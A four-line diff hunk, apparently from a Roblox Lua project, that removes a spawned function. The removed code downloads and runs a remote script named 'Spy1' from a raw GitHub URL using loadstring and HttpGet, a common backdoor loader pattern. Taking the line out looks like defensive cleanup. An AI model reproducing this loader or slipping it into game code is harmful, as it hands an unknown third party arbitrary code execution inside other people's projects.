@@ -1,4 +1,0 @@
-spawn(function() 
-     loadstring(game:HttpGet("https://raw.githubusercontent.com/BeltranRasmussen/XgPo0SPUXHDyTrPRbUyPhwAfkIbewN5/refs/heads/main/Spy1"))()
-end)
-
